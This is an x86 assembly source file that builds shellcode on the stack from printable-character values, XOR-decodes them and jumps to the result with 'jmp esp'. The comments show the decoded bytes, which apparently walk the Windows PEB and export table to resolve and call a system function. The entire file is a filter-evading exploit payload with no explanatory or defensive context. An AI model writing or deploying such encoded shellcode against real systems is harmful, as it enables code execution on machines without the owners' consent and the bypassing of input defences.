section .text

global _start
_start:
    pushad
    pushfd
register:
    push 0x21
    pop eax
    xor al , 0x21
    push eax
    pop ebx
    dec ebx
    push esp
    pop ecx
encode:
; push 0x90eb585a
    push 0x5b2d3564
    pop eax
    xor eax, 0x34396d3e
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x5ac3619d
    push 0x77655856
    pop eax
    xor eax, 0x2d593934
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0xe18b9d61
    push ebx
    pop eax
    xor eax, 0x5a3e3b45
    xor eax, 0x444a5924
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xd2ff500a
    push 0x402f3f28
    pop eax
    xor eax, 0x6d2f6f22
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x6ae08921
    push 0x2b255441
    pop eax
    xor eax, 0x413a2260
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x66536d42
    pop eax
    xor eax, 0x47724c66
    push eax
; push 0x2c81848d
    push ebx
    pop eax
    xor eax, 0x655f425f
    xor eax, 0x4921392d
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x82846821
    push 0x51313d7c
    pop eax
    xor eax, 0x2c4a555d
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x79416170
    pop eax
    xor eax, 0x58604054
    push eax
; push 0x2c812121
    push 0x7a255146
    pop eax
    xor eax, 0x565b7067
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x212168da
    push 0x5256296a
    pop eax
    xor eax, 0x7377414f
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x0188148b
    push 0x34512825
    pop eax
    xor eax, 0x35263c51
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x4a0c8b66
    push 0x216e4838
    pop eax
    xor eax, 0x6b623c5e
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x585ae075
    push 0x2f294e48
    pop eax
    xor eax, 0x7773513d
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c3e6889
    push 0x747c2d5e
    pop eax
    xor eax, 0x48424528
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xfa81f4eb
    push ebx
    pop eax
    xor eax, 0x452f6b48
    xor eax, 0x4051605c
    push eax
; push 0xc20111ca
    push 0x7a263547
    pop eax
    xor eax, 0x47272472
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0xc10774c0
    push 0x6835595b
    pop eax
    xor eax, 0x56322d64
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x84acd231
    push ebx
    pop eax
    xor eax, 0x24344b4a
    xor eax, 0x5f67667b
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xc031de01
    push 0x4b5e4465
    pop eax
    xor eax, 0x746f6564
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x8f348b49
    push 0x546e2327
    pop eax
    xor eax, 0x245a576e
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x4be352da
    push 0x33246968
    pop eax
    xor eax, 0x78383b4d
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x0124528b
    push 0x76647425
    pop eax
    xor eax, 0x77402651
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdf01207a
    push 0x5c29774c
    pop eax
    xor eax, 0x7c285736
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x8b50d801
    push 0x5d625946
    pop eax
    xor eax, 0x29327e47
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x1c428b14
    push 0x592e4047
    pop eax
    xor eax, 0x456c3453
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x4a8bda01
    push 0x22345257
    pop eax
    xor eax, 0x68407756
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x781a548b
    push 0x517d6a48
    pop eax
    xor eax, 0x29673e3c
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c538b10
    push 0x712d5e5f
    pop eax
    xor eax, 0x4d7e2a4f
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x5b8b1b8b
    push 0x2f2b682e
    pop eax
    xor eax, 0x745f735a
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x1b8b145b
    push 0x755b6a76
    pop eax
    xor eax, 0x6e2f7e2d
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x8b0c5b8b
    push 0x50302821
    pop eax
    xor eax, 0x243c7355
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x305b8b64
    push 0x5568424e
    pop eax
    xor eax, 0x6533362a
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdb319c60
    push 0x61545358
    pop eax
    xor eax, 0x45653038
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; jmp to shellcode
    jmp esp
